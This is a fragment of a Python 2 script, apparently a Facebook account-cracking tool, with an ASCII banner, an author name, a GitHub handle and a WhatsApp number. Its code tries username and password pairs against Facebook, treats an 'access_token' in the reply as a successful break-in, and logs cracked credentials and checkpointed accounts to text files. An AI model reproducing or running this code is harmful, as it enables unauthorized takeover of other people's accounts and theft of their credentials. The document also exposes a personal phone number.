...
_dM_     _dMM_MMMMMMM9'    _MM_    
  ...
  Auther  :  TUAN Chowdhury                                 Github  :  abdultuan19
  Whapp   :  01739351917
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[*_*TUAN Successful*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('TUAN/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[TUAN(CP) Login After 3 Days] ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('TUAN/checkpoint.txt', 'a')
